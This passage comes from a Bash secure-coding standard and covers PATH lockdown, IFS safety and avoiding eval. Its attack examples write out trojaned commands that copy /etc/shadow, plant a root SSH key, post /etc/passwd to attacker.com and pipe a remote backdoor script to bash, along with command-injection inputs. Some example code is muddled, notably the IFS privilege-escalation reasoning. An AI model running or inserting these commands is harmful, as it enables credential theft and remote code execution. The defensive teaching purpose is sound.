**Lock down PATH at script start:**

```bash
#!/bin/bash
set -euo pipefail

# ✓ Correct - set secure PATH immediately
readonly -- PATH='/usr/local/bin:/usr/bin:/bin'
export PATH

# Rest of script uses locked-down PATH
command=$(which ls)  # Searches only trusted directories
```

**Alternative: Validate existing PATH:**

```bash
#!/bin/bash
set -euo pipefail

# ✓ Correct - validate PATH contains no dangerous elements
[[ "$PATH" =~ \.  ]] && die 1 'PATH contains current directory' ||:
[[ "$PATH" =~ ^:  ]] && die 1 'PATH starts with empty element' ||:
[[ "$PATH" =~ ::  ]] && die 1 'PATH contains empty element' ||:
[[ "$PATH" =~ :$  ]] && die 1 'PATH ends with empty element' ||:

# Additional checks for suspicious paths
[[ "$PATH" =~ /tmp ]] && die 1 'PATH contains /tmp' ||:
[[ "$PATH" =~ ^/home ]] && die 1 'PATH starts with user home directory' ||:
```

**Attack Example 1: Current Directory in PATH**

```bash
# Vulnerable script (doesn't set PATH)
#!/bin/bash
# /usr/local/bin/backup.sh
set -euo pipefail

# Script intends to use system ls
ls -la /etc > /tmp/backup_list.txt
```

**Attack:**
```bash
# Attacker creates malicious 'ls' in /tmp
cat > /tmp/ls << 'EOT'
#!/bin/bash
# Steal sensitive data
cp /etc/shadow /tmp/stolen_shadow
chmod 644 /tmp/stolen_shadow
# Now execute real ls to appear normal
/bin/ls "$@"
EOT
chmod +x /tmp/ls

# Attacker sets PATH with /tmp first
export PATH=/tmp:$PATH

# When victim runs backup script from /tmp:
cd /tmp
/usr/local/bin/backup.sh

# Script executes /tmp/ls instead of /bin/ls
# Attacker's code runs with script's privileges
```

**Attack Example 2: Empty PATH Element**

```bash
# PATH with empty element (double colon)
PATH=/usr/local/bin::/usr/bin:/bin

# Empty element is interpreted as current directory
# Same risk as PATH=.:/usr/local/bin:/usr/bin:/bin
```

**Attack:**
```bash
# Attacker creates malicious command in accessible directory
cat > ~/tar << 'EOT'
#!/bin/bash
# Exfiltrate data
curl -X POST -d @/etc/passwd https://attacker.com/collect
# Execute real command
/bin/tar "$@"
EOT
chmod +x ~/tar

# Vulnerable script runs from ~
cd ~
# With :: in PATH, searches current directory (~/tar found!)
tar -czf backup.tar.gz data/
```

**Attack Example 3: Writable Directory in PATH**

```bash
# PATH includes /opt/local/bin which is world-writable (misconfigured)
PATH=/opt/local/bin:/usr/local/bin:/usr/bin:/bin
```

**Attack:**
```bash
# Attacker creates trojan in writable PATH directory
cat > /opt/local/bin/ps << 'EOT'
#!/bin/bash
# Backdoor: Add SSH key for root access
mkdir -p /root/.ssh
echo "ssh-rsa AAAA... attacker@evil" >> /root/.ssh/authorized_keys
# Execute real ps
/bin/ps "$@"
EOT
chmod +x /opt/local/bin/ps

# When ANY script runs 'ps', attacker gains root access
```

**Secure PATH patterns:**

**Pattern 1: Complete lockdown (recommended for security-critical scripts):**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Lock down PATH immediately
readonly -- PATH='/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin'
export PATH

# Use commands with confidence
tar -czf /backup/data.tar.gz /var/data
systemctl restart nginx
```

**Pattern 2: Full command paths (maximum security):**

```bash
#!/bin/bash
set -euo pipefail

# Don't rely on PATH at all - use absolute paths
/bin/tar -czf /backup/data.tar.gz /var/data
/usr/bin/systemctl restart nginx
/usr/bin/apt-get update

# Especially critical for common commands that might be trojaned
/bin/rm -rf /tmp/workdir
/bin/cat /etc/passwd | /bin/grep root
```

**Pattern 3: PATH validation with fallback:**

```bash
#!/bin/bash
set -euo pipefail

validate_path() {
  # Check for dangerous PATH elements
  if [[ "$PATH" =~ \\.  ]] || \
     [[ "$PATH" =~ ^:  ]] || \
     [[ "$PATH" =~ ::  ]] || \
     [[ "$PATH" =~ :$  ]] || \
     [[ "$PATH" =~ /tmp ]]; then
    # PATH is suspicious, reset to safe default
    export PATH='/usr/local/bin:/usr/bin:/bin'
    readonly -- PATH
    warn 'Suspicious PATH detected, reset to safe default'
  fi
}

validate_path

# Rest of script
```

**Pattern 4: Command verification:**

```bash
#!/bin/bash
set -euo pipefail

# Verify critical commands are from expected locations
verify_command() {
  local cmd=$1
  local expected_path=$2
  local actual_path

  actual_path=$(command -v "$cmd")

  if [[ "$actual_path" != "$expected_path" ]]; then
    die 1 "Security: $cmd is $actual_path, expected $expected_path"
  fi
}

# Verify before using critical commands
verify_command tar /bin/tar
verify_command rm /bin/rm
verify_command systemctl /usr/bin/systemctl

# Now safe to use
tar -czf backup.tar.gz data/
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - trusting inherited PATH
#!/bin/bash
set -euo pipefail
# No PATH setting - inherits from environment
ls /etc  # Could execute trojan ls from anywhere in caller's PATH

# ✗ Wrong - PATH includes current directory
export PATH=.:$PATH
# Now any command can be hijacked from current directory

# ✗ Wrong - PATH includes /tmp
export PATH=/tmp:/usr/local/bin:/usr/bin:/bin
# /tmp is world-writable, attacker can place trojans there

# ✗ Wrong - PATH includes user home directories
export PATH=/home/user/bin:$PATH
# Attacker may have write access to /home/user/bin

# ✗ Wrong - empty elements in PATH
export PATH=/usr/local/bin::/usr/bin:/bin  # :: is current directory
export PATH=:/usr/local/bin:/usr/bin:/bin  # Leading : is current directory
export PATH=/usr/local/bin:/usr/bin:/bin:  # Trailing : is current directory

# ✗ Wrong - setting PATH late in script
#!/bin/bash
set -euo pipefail
# Commands here use inherited PATH (dangerous!)
whoami
hostname
# Only now setting secure PATH (too late!)
export PATH='/usr/bin:/bin'

# ✓ Correct - set PATH at top of script
#!/bin/bash
set -euo pipefail
readonly -- PATH='/usr/local/bin:/usr/bin:/bin'
export PATH
# Now all commands use secure PATH
```

**Edge case: Scripts that need custom paths:**

```bash
#!/bin/bash
set -euo pipefail

# Start with secure base PATH
readonly -- BASE_PATH='/usr/local/bin:/usr/bin:/bin'

# Add application-specific paths
readonly -- APP_PATH='/opt/myapp/bin'

# Combine with secure base first
export PATH="$BASE_PATH:$APP_PATH"
readonly -- PATH

# Validate application path exists and is not world-writable
[[ -d "$APP_PATH" ]] || die 1 "Application path does not exist ${APP_PATH@Q}"
[[ -w "$APP_PATH" ]] && die 1 "Application path is writable ${APP_PATH@Q}"

# Use commands from combined PATH
myapp-command --option
```

**Special consideration: Sudo and PATH:**

```bash
# When using sudo, PATH is reset by default
# /etc/sudoers typically includes:
# Defaults secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# ✓ This is safe - sudo uses secure_path
sudo /usr/local/bin/backup.sh

# ✗ This preserves user's PATH (dangerous if env_keep includes PATH)
# Don't configure sudoers with: Defaults env_keep += "PATH"

# ✓ Correct - script sets its own PATH regardless
sudo /usr/local/bin/backup.sh
# Even if sudo preserves PATH, script overwrites it:
#   readonly -- PATH='/usr/local/bin:/usr/bin:/bin'
```

**Checking PATH from within script:**

```bash
# Debug: Show PATH being used
debug() {
  >&2 echo "DEBUG: Current PATH=$PATH"
  >&2 echo "DEBUG: which tar=$(command -v tar)"
  >&2 echo "DEBUG: which rm=$(command -v rm)"
}

((DEBUG)) && debug

# Verify PATH doesn't contain dangerous elements
check_path_security() {
  local -a issues=()

  [[ "$PATH" =~ \\.  ]] && issues+=('contains current directory (.)') ||:
  [[ "$PATH" =~ ^:  ]] && issues+=('starts with empty element') ||:
  [[ "$PATH" =~ ::  ]] && issues+=('contains empty element (::)') ||:
  [[ "$PATH" =~ :$  ]] && issues+=('ends with empty element') ||:
  [[ "$PATH" =~ /tmp ]] && issues+=('contains /tmp') ||:

  if ((${#issues[@]} > 0)); then
    error 'PATH security issues detected:'
    local issue
    for issue in "${issues[@]}"; do
      error "  - $issue"
    done
    return 1
  fi

  info 'PATH security check passed'
  return 0
}

check_path_security || die 1 'PATH security validation failed'
```

**System-wide PATH security:**

```bash
# Check system default PATH in /etc/environment
cat /etc/environment
# Should be: PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# Check for world-writable directories in system PATH
IFS=':' read -ra path_dirs <<< "$PATH"
for dir in "${path_dirs[@]}"; do
  if [[ -d "$dir" && -w "$dir" ]]; then
    warn "World-writable directory in PATH ${dir@Q}"
  fi
done

# Find world-writable directories in PATH
find $(echo "$PATH" | tr ':' ' ') -maxdepth 0 -type d -writable 2>/dev/null
```

**Real-world example: Distribution installer script:**

```bash
#!/bin/bash
# Secure installer script for system-wide deployment
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Lock down PATH immediately - critical for security
readonly -- PATH='/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin'
export PATH

declare -r VERSION=1.0.0
declare -r SCRIPT_NAME=$(basename "$0")

# Script metadata
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*}

# Verify we're using expected command locations
command -v tar | grep -q '^/bin/tar$' || \
  die 1 'Security: tar command not from /bin/tar'

# Rest of secure installation logic
```

**Summary:**

- **Always set PATH** explicitly at the start of security-critical scripts
- **Use `readonly PATH`** to prevent later modification
- **Never include** `.` (current directory), empty elements, `/tmp`, or user directories
- **Validate PATH** if you must use inherited environment
- **Use absolute paths** for critical commands as defense in depth
- **Place PATH setting early** - first few lines after `set -euo pipefail`
- **Check permissions** on directories in PATH (none should be world-writable)
- **Test PATH security** as part of your script testing process

**Key principle:** PATH is trusted implicitly by command execution. An attacker who controls your PATH controls which code runs. Always secure it first.


---


**Rule: BCS1003**

## IFS Manipulation Safety

**Never trust or use inherited IFS values. Always protect IFS changes to prevent field splitting attacks and unexpected behavior.**

**Rationale:**

- **Security Vulnerability**: Attackers can manipulate IFS in the calling environment to exploit scripts that don't protect IFS
- **Field Splitting Exploits**: Malicious IFS values cause word splitting at unexpected characters, breaking argument parsing
- **Command Injection**: IFS manipulation combined with unquoted variables enables command execution
- **Global Side Effects**: Changing IFS without restoration breaks subsequent operations throughout the script
- **Environment Inheritance**: IFS is inherited from parent processes and may be attacker-controlled
- **Subtle Bugs**: IFS changes cause hard-to-debug issues when forgotten or improperly scoped

**Understanding IFS:**

IFS (Internal Field Separator) controls how Bash splits words during expansion. Default is `$' \t\n'` (space, tab, newline).

```bash
# Default IFS behavior
IFS=$' \t\n'  # Space, tab, newline (default)
data="one two three"
read -ra words <<< "$data"
# Result: words=("one" "two" "three")

# Custom IFS for CSV parsing
IFS=','
data="apple,banana,orange"
read -ra fruits <<< "$data"
# Result: fruits=("apple" "banana" "orange")
```

**Attack Example 1: Field Splitting Exploitation**

```bash
# Vulnerable script - doesn't protect IFS
#!/bin/bash
set -euo pipefail

# Script expects space-separated list
process_files() {
  local -- file_list=$1
  local -a files

  # Vulnerable: IFS could be manipulated
  read -ra files <<< "$file_list"

  for file in "${files[@]}"; do
    rm -- "$file"  # Deletes each file
  done
}

# Normal usage
process_files "temp1.txt temp2.txt temp3.txt"
# Deletes: temp1.txt, temp2.txt, temp3.txt
```

**Attack:**
```bash
# Attacker sets IFS to slash
export IFS='/'
./vulnerable-script.sh

# Inside the script, file_list="temp1.txt temp2.txt"
# With IFS='/', read -ra splits on '/' not spaces!
# files=("temp1.txt temp2.txt")  # NOT split - treated as one filename!

# Or worse - attacker uses this to bypass filtering:
export IFS=$'\n'
./vulnerable-script.sh "/etc/passwd
/root/.ssh/authorized_keys"
# Now the script processes these filenames as if they were in the list
```

**Attack Example 2: Command Injection via IFS**

```bash
# Vulnerable script
#!/bin/bash
set -euo pipefail

# Process user-provided command with arguments
user_input=$1
# Split on spaces to get command and arguments
read -ra cmd_parts <<< "$user_input"

# Execute command
"${cmd_parts[@]}"
```

**Attack:**
```bash
# Attacker manipulates IFS before calling script
export IFS='X'
./vulnerable-script.sh "lsX-laX/etc/shadow"

# With IFS='X', the splitting becomes:
# cmd_parts=("ls" "-la" "/etc/shadow")
# Script executes: ls -la /etc/shadow
# Attacker bypassed any input validation that checked for spaces!
```

**Attack Example 3: Privilege Escalation via SUID Script**

```bash
# Vulnerable SUID script (should never exist, but illustrative)
#!/bin/bash
# /usr/local/bin/backup.sh (SUID root - NEVER DO THIS!)

# Supposed to back up only allowed directories
allowed_dirs='home var opt'

# Check if user-provided directory is allowed
user_dir=$1
is_allowed=0

for dir in $allowed_dirs; do  # Unquoted expansion uses IFS!
  [[ "$user_dir" == "$dir" ]] && is_allowed=1 ||:
done

((is_allowed)) || die 5 "Directory not allowed: $user_dir"

# Back up the directory with root privileges
tar -czf "/backup/${user_dir}.tar.gz" "/$user_dir"
```

**Attack:**
```bash
# Attacker sets IFS to 'e'
export IFS='e'
/usr/local/bin/backup.sh "etc"

# The loop splits "home var opt" on 'e':
# Results in words: "hom" " var opt"
# None match "etc", but if validation was bypassed differently...

# More direct attack - set IFS to include the target:
export IFS=' e'
# Now "home" splits to "hom " "
# The attacker can craft IFS to make "etc" appear in the allowed list
```

**Safe Pattern 1: Save and Restore IFS (Explicit)**

```bash
# ✓ Correct - save, modify, restore
parse_csv() {
  local -- csv_data=$1
  local -a fields
  local -- saved_ifs

  # Save current IFS
  saved_ifs="$IFS"

  # Set IFS for CSV parsing
  IFS=','
  read -ra fields <<< "$csv_data"

  # Restore IFS immediately
  IFS="$saved_ifs"

  # Process fields with original IFS restored
  for field in "${fields[@]}"; do
    info "Field: $field"
  done
}
```

**Safe Pattern 2: Subshell Isolation (Preferred)**

```bash
# ✓ Correct - IFS change isolated to subshell
parse_csv() {
  local -- csv_data=$1
  local -a fields

  # Use subshell - IFS change automatically reverts when subshell exits
  fields=( $(
    IFS=','
    read -ra temp <<< "$csv_data"
    printf '%s\n' "${temp[@]}"
  ) )

  # Or simpler - capture in subshell directly
  IFS=',' read -ra fields <<< "$csv_data"  # This also works in some contexts

  # Process with original IFS intact
  for field in "${fields[@]}"; do
    info "Field: $field"
  done
}
```

**Safe Pattern 3: Local IFS in Function**

```bash
# ✓ Correct - use local to scope IFS change
parse_csv() {
  local -- csv_data=$1
  local -a fields
  local -- IFS  # Make IFS local to this function

  # Now changes to IFS only affect this function
  IFS=','
  read -ra fields <<< "$csv_data"

  # IFS automatically restored when function returns
  for field in "${fields[@]}"; do
    info "Field: $field"
  done
}

# After function returns, IFS is unchanged in caller
```

**Safe Pattern 4: One-Line IFS Assignment**

```bash
# ✓ Correct - IFS change applies only to single command
# This is a bash feature: VAR=value command applies VAR only to that command

# Parse CSV in one line
IFS=',' read -ra fields <<< "$csv_data"
# IFS is automatically reset after the read command

# Parse colon-separated PATH
IFS=':' read -ra path_dirs <<< "$PATH"
# IFS is automatically reset after the read command

# This is the most concise and safe pattern for single operations
```

**Safe Pattern 5: Explicitly Set IFS at Script Start**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Explicitly set IFS to known-safe value at script start
# This defends against inherited malicious IFS
IFS=$' \t\n'  # Space, tab, newline (standard default)
readonly IFS  # Prevent modification
export IFS

# Rest of script operates with trusted IFS
# Any attempt to modify IFS will fail due to readonly
```

**Edge case: IFS with read -d (delimiter)**

```bash
# When using read -d, IFS still matters for field splitting
# The delimiter (-d) determines where to stop reading
# IFS determines how to split what was read

# Reading null-delimited input (common with find -print0)
while IFS= read -r -d '' file; do
  # IFS= prevents field splitting
  # -d '' sets null byte as delimiter
  process "$file"
done < <(find . -type f -print0)

# This is the safe pattern for filenames with spaces
```

**Edge case: IFS and globbing**

```bash
# IFS affects word splitting, NOT pathname expansion (globbing)
IFS=':'
files=*.txt  # Glob expands normally

# But IFS affects how results are split if unquoted
echo $files  # Splits on ':' - WRONG!

# Always quote to prevent IFS-based splitting
echo "$files"  # Safe - no splitting
```

**Edge case: Empty IFS**

```bash
# Setting IFS='' (empty) disables field splitting entirely
IFS=''
data="one two three"
read -ra words <<< "$data"
# Result: words=("one two three")  # NOT split!

# This can be useful to preserve exact input
IFS= read -r line < file.txt  # Preserves leading/trailing whitespace
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - modifying IFS without save/restore
IFS=','
read -ra fields <<< "$csv_data"
# IFS is now ',' for the rest of the script - BROKEN!

# ✓ Correct - save and restore
saved_ifs="$IFS"
IFS=','
read -ra fields <<< "$csv_data"
IFS="$saved_ifs"

# ✗ Wrong - trusting inherited IFS
#!/bin/bash
set -euo pipefail
# No IFS protection - vulnerable to manipulation!
read -ra parts <<< "$user_input"

# ✓ Correct - set IFS explicitly
#!/bin/bash
set -euo pipefail
IFS=$' \t\n'  # Set to known-safe value
readonly IFS
read -ra parts <<< "$user_input"

# ✗ Wrong - forgetting to restore IFS in error cases
saved_ifs="$IFS"
IFS=','
some_command || return 1  # IFS not restored on error!
IFS="$saved_ifs"

# ✓ Correct - use trap or subshell
(
  IFS=','
  some_command || return 1  # Subshell ensures IFS is restored
)

# ✗ Wrong - modifying IFS globally
IFS=$'\n'  # Changed for entire script
for line in $(cat file.txt); do
  process "$line"
done
# Now ALL subsequent operations use wrong IFS!

# ✓ Correct - isolate IFS change
while IFS= read -r line; do
  process "$line"
done < file.txt

# ✗ Wrong - using IFS for complex parsing
IFS=':' read -r user pass uid gid name home shell <<< "$passwd_line"
# Fragile - breaks if any field contains ':'

# ✓ Correct - use cut or awk for structured data
user=$(cut -d: -f1 <<< "$passwd_line")
uid=$(cut -d: -f3 <<< "$passwd_line")
```

**Complete safe example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Set IFS to known-safe value immediately
IFS=$' \t\n'
readonly IFS
export IFS

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Parse CSV data safely
parse_csv_file() {
  local -- csv_file=$1
  local -a records

  # Read file line by line
  local -a fields
  while IFS= read -r line; do
    # Parse CSV fields using subshell-isolated IFS
    (
      IFS=','
      read -ra fields <<< "$line"

      # Process fields
      info "Name: ${fields[0]}"
      info "Email: ${fields[1]}"
      info "Age: ${fields[2]}"
    )
  done < "$csv_file"
}

# Alternative: One-line IFS for each read
parse_csv_line() {
  local -- csv_line=$1
  local -a fields

  # IFS applies only to this read command
  IFS=',' read -ra fields <<< "$csv_line"

  # Process with normal IFS
  for field in "${fields[@]}"; do
    info "Field: $field"
  done
}

main() {
  parse_csv_file 'data.csv'
}

main "$@"

#fin
```

**Testing IFS safety:**

```bash
# Test script behavior with malicious IFS
test_ifs_safety() {
  # Save original IFS
  local -- original_ifs="$IFS"

  # Set malicious IFS
  IFS='/'

  # Run function that should be IFS-safe
  parse_csv_line "apple,banana,orange"

  # Verify IFS was restored
  if [[ "$IFS" == "$original_ifs" ]]; then
    success 'IFS properly protected'
  else
    error 'IFS leaked - security vulnerability!'
    return 1
  fi
}
```

**Checking current IFS:**

```bash
# Display current IFS (non-printable characters shown)
debug() {
  local -- ifs_visual
  ifs_visual=$(printf '%s' "$IFS" | cat -v)
  >&2 echo "DEBUG: Current IFS: [$ifs_visual]"
  >&2 echo "DEBUG: IFS length: ${#IFS}"
  >&2 printf 'DEBUG: IFS bytes: %s\n' "$(printf '%s' "$IFS" | od -An -tx1)"
}

# Verify IFS is default
verify_default_ifs() {
  local -- expected=$' \t\n'
  if [[ "$IFS" == "$expected" ]]; then
    info 'IFS is default (safe)'
  else
    warn 'IFS is non-standard'
    debug
  fi
}
```

**Summary:**

- **Set IFS explicitly** at script start: `IFS=$' \t\n'; readonly IFS`
- **Use subshells** to isolate IFS changes: `( IFS=','; read -ra fields <<< "$data" )`
- **Use one-line assignment** for single commands: `IFS=',' read -ra fields <<< "$data"`
- **Use local IFS** in functions to scope changes: `local -- IFS; IFS=','`
- **Always restore IFS** if modifying: `saved_ifs="$IFS"; IFS=','; ...; IFS="$saved_ifs"`
- **Never trust inherited IFS** - always set it yourself
- **Test IFS safety** as part of security validation

**Key principle:** IFS is a global variable that affects word splitting throughout your script. Treat it as security-critical and always protect changes with proper scoping or save/restore patterns.


---


**Rule: BCS1004**

## Eval Command

**Never use `eval` with untrusted input. Avoid `eval` entirely unless absolutely necessary, and even then, seek alternatives first.**

**Rationale:**

- **Code Injection**: `eval` executes arbitrary code, allowing complete system compromise if input is attacker-controlled
- **No Sandboxing**: `eval` runs with full script privileges, including file access, network operations, and command execution
- **Bypasses All Validation**: Even sanitized input can contain metacharacters that enable injection
- **Difficult to Audit**: Dynamic code construction makes security review nearly impossible
- **Error Prone**: Quoting and escaping requirements are complex and frequently implemented incorrectly
- **Better Alternatives Exist**: Almost every use case has a safer alternative using arrays, indirect expansion, or proper data structures

**Understanding eval:**

`eval` takes a string, performs all expansions on it, then executes the result as a command.

```bash
# Basic eval behavior
cmd='echo "Hello World"'
eval "$cmd"  # Executes: echo "Hello World"
# Output: Hello World

# The danger: eval performs expansion TWICE
var='$(whoami)'
eval "echo $var"  # First expansion: echo $(whoami)
                   # Second expansion: executes whoami command!
# Output: username
```

**Attack Example 1: Direct Command Injection**

```bash
# Vulnerable script - NEVER DO THIS!
#!/bin/bash
set -euo pipefail

# Script allows user to set a variable
user_input=$1

# Dangerous: eval executes arbitrary code
eval "$user_input"
```

**Attack:**
```bash
# Attacker provides malicious input
./vulnerable-script.sh 'rm -rf /tmp/*'
# Executes: rm -rf /tmp/*

# Or worse - exfiltrate data
./vulnerable-script.sh 'curl -X POST -d @/etc/passwd https://attacker.com/collect'

# Or install backdoor
./vulnerable-script.sh 'curl https://attacker.com/backdoor.sh | bash'

# Or create SUID shell
./vulnerable-script.sh 'cp /bin/bash /tmp/rootshell; chmod u+s /tmp/rootshell'
```

**Attack Example 2: Variable Name Injection**

```bash
# Vulnerable script - seems safe but isn't!
#!/bin/bash
set -euo pipefail

# User provides variable name and value
var_name=$1
var_value=$2

# Attempt to set variable dynamically - DANGEROUS!
eval "$var_name='$var_value'"

echo "Variable $var_name has been set"
```

**Attack:**
```bash
# Attacker injects command via variable name
./vulnerable-script.sh 'x=$(rm -rf /important/data)' 'ignored'

# The eval executes:
# x=$(rm -rf /important/data)='ignored'
# Which executes the command substitution!

# Or exfiltrate via variable value
./vulnerable-script.sh 'x' '$(cat /etc/shadow > /tmp/stolen)'
# The eval executes:
# x='$(cat /etc/shadow > /tmp/stolen)'
# Command substitution runs with script privileges!
```

**Attack Example 3: Escaped Character Bypass**

```bash
# Vulnerable script - attempts sanitization
#!/bin/bash
set -euo pipefail

# User input for calculation
user_expr=$1

# Attempt to sanitize - INSUFFICIENT!
sanitized="${user_expr//[^0-9+\\-*\\/]/}"  # Allow only digits and operators

# Still dangerous!
eval "result=$sanitized"
echo "Result: $result"
```

**Attack:**
```bash
# Attacker uses allowed characters maliciously
./vulnerable-script.sh '1+1)); curl https://attacker.com/steal?data=$(cat /etc/passwd); echo $((1'

# Or uses integer assignment to overwrite critical variables
./vulnerable-script.sh 'PATH=0'
# Now PATH is set to 0, breaking the script or enabling other attacks
```

**Attack Example 4: Log Injection via eval**

```bash
# Vulnerable logging function
log_event() {
  local -- event=$1
  local -- timestamp
  timestamp=$(date '+%Y-%m-%d %H:%M:%S')

  # Dangerous: eval used to expand variables in log template
  local -- log_template='echo "$timestamp - Event: $event" >> /var/log/app.log'
  eval "$log_template"
}

# Usage
user_action=$1
log_event "$user_action"
```

**Attack:**
```bash
# Attacker injects command via event parameter
./vulnerable-script.sh 'login"; cat /etc/shadow > /tmp/pwned; echo "'

# The eval executes:
# echo "2025-01-15 10:30:00 - Event: login"; cat /etc/shadow > /tmp/pwned; echo "" >> /var/log/app.log
# Three commands execute: echo, cat (malicious), echo
```

**Safe Alternative 1: Use Arrays for Command Construction**

```bash
# ✓ Correct - build command safely with array
build_find_command() {
  local -- search_path=$1
  local -- file_pattern=$2
  local -a cmd

  # Build command in array - no eval needed!
  cmd=(find "$search_path" -type f -name "$file_pattern")

  # Execute array safely
  "${cmd[@]}"
}

# Usage
build_find_command '/var/data' '*.txt'

# Array preserves exact arguments, no injection possible
```

**Safe Alternative 2: Use Indirect Expansion for Variable References**

```bash
# ✗ Wrong - using eval for variable indirection
var_name='HOME'
eval "value=\\$$var_name"  # Gets value of $HOME
echo "$value"

# ✓ Correct - use indirect expansion
var_name='HOME'
echo "${!var_name}"  # Direct syntax, no eval needed

# ✓ Correct - for assignment, use declare/printf
var_name='MY_VAR'
value='Hello World'
printf -v "$var_name" '%s' "$value"  # Assigns to MY_VAR safely
echo "${!var_name}"  # Access value
```

**Safe Alternative 3: Use Associative Arrays for Dynamic Data**

```bash
# ✗ Wrong - using eval to create dynamic variables
for i in {1..5}; do
  eval "var_$i='value $i'"  # Creates var_1, var_2, etc.
done

# ✓ Correct - use associative array
declare -A data
for i in {1..5}; do
  data["var_$i"]="value $i"
done

# Access values
echo "${data[var_3]}"  # value 3
```

**Safe Alternative 4: Use Functions Instead of Dynamic Code**

```bash
# ✗ Wrong - eval to select function dynamically
action=$1
eval "${action}_function"  # If action='malicious', dangerous!

# ✓ Correct - use case statement
case "$action" in
  start)   start_function ;;
  stop)    stop_function ;;
  restart) restart_function ;;
  status)  status_function ;;
  *)       die 22 "Invalid action ${action@Q}" ;;
esac

# ✓ Also correct - use array of function names
declare -A actions=(
  [start]=start_function
  [stop]=stop_function
  [restart]=restart_function
  [status]=status_function
)

if [[ -v "actions[$action]" ]]; then
  "${actions[$action]}"
else
  die 22 "Invalid action ${action@Q}"
fi
```

**Safe Alternative 5: Use Command Substitution for Output Capture**

```bash
# ✗ Wrong - eval for command output
cmd='ls -la /tmp'
eval "output=\$($cmd)"  # Dangerous!

# ✓ Correct - direct command substitution
output=$(ls -la /tmp)

# ✓ Correct - if command is in variable, use array
declare -a cmd=(ls -la /tmp)
output=$("${cmd[@]}")
```

**Safe Alternative 6: Use read for Parsing**

```bash
# ✗ Wrong - eval for parsing key=value pairs
config_line="PORT=8080"
eval "$config_line"  # Sets PORT variable - DANGEROUS!

# ✓ Correct - use read or parameter expansion
IFS='=' read -r key value <<< "$config_line"
declare -g "$key=$value"  # Still be careful with key validation!

# ✓ Better - validate key before assignment
if [[ "$key" =~ ^[A-Z_][A-Z0-9_]*$ ]]; then
  declare -g "$key=$value"
else
  die 22 "Invalid configuration key: $key"
fi
```

**Safe Alternative 7: Use Arithmetic Expansion for Math**

```bash
# ✗ Wrong - eval for arithmetic
user_expr="$1"
eval "result=$((user_expr))"  # Still risky!

# ✓ Correct - validate first, then use arithmetic
if [[ "$user_expr" =~ ^[0-9+\\-*/\\ ()]+$ ]]; then
  result=$((user_expr))
else
  die 22 "Invalid arithmetic expression: $user_expr"
fi

# ✓ Better - use bc for complex math (isolates operations)
result=$(bc <<< "$user_expr")
```

**Edge case: When eval seems necessary**

**Scenario: Dynamic variable names in loops**

```bash
# Seems to need eval
for service in nginx apache mysql; do
  eval "${service}_status=\$(systemctl is-active $service)"
done

# ✓ Better - use associative array
declare -A service_status
for service in nginx apache mysql; do
  service_status["$service"]=$(systemctl is-active "$service")
done
```

**Scenario: Sourcing configuration with variable expansion**

```bash
# Config file contains: APP_DIR="$HOME/myapp"
# Simple sourcing doesn't expand $HOME

# Seems to need eval
while IFS= read -r line; do
  eval "$line"
done < config.txt

# ✓ Better - source directly (bash expands variables)
source config.txt

# ✓ Even better - validate config file first
if [[ -f config.txt && -r config.txt ]]; then
  # Check for dangerous patterns
  if grep -qE '(eval|exec|`|\$\()' config.txt; then
    die 1 'Config file contains dangerous patterns'
  fi
  source config.txt
else
  die 2 'Config file not found or not readable'
fi
```

**Scenario: Building complex command with many options**

```bash
# Seems to need eval to build command string
cmd="find /data -type f"
[[ -n "$name_pattern" ]] && cmd="$cmd -name '$name_pattern'"
[[ -n "$size" ]] && cmd="$cmd -size '$size'"
eval "$cmd"  # DANGEROUS!

# ✓ Correct - use array
declare -a cmd=(find /data -type f)
[[ -n "$name_pattern" ]] && cmd+=(-name "$name_pattern")
[[ -n "$size" ]] && cmd+=(-size "$size")
"${cmd[@]}"  # Safe execution
```

**The rare legitimate use of eval (with extreme caution):**

```bash
# Parsing output with known-safe format from trusted source
# Example: getconf outputs shell variable assignments
eval "$(getconf ARG_MAX)"  # Sets ARG_MAX variable

# Still better to parse manually:
ARG_MAX=$(getconf ARG_MAX)

# Another rare case: generating code from templates (development/build only)
# NEVER in production with user input!
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - eval with any user input
eval "$user_command"

# ✓ Correct - validate against whitelist
case "$user_command" in
  start|stop|restart|status) systemctl "$user_command" myapp ;;
  *) die 22 "Invalid command: $user_command" ;;
esac

# ✗ Wrong - eval for variable assignment
eval "$var_name='$var_value'"

# ✓ Correct - use printf -v
printf -v "$var_name" '%s' "$var_value"

# ✗ Wrong - eval to source file with expansion
eval "source $config_file"

# ✓ Correct - source directly or use safe expansion
source "$config_file"

# ✗ Wrong - eval in loop
for file in *.txt; do
  eval "process_${file%.txt}"  # Trying to call function dynamically
done

# ✓ Correct - use array lookup or case statement
declare -A processors=(
  [data]=process_data
  [log]=process_log
)
for file in *.txt; do
  base="${file%.txt}"
  if [[ -v "processors[$base]" ]]; then
    "${processors[$base]}"
  fi
done

# ✗ Wrong - eval to check if variable is set
eval "if [[ -n \\$$var_name ]]; then echo set; fi"

# ✓ Correct - use -v test
if [[ -v "$var_name" ]]; then
  echo set
fi

# ✗ Wrong - double expansion with eval
eval "echo \$$var_name"

# ✓ Correct - indirect expansion
echo "${!var_name}"
```

**Complete safe example (no eval):**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
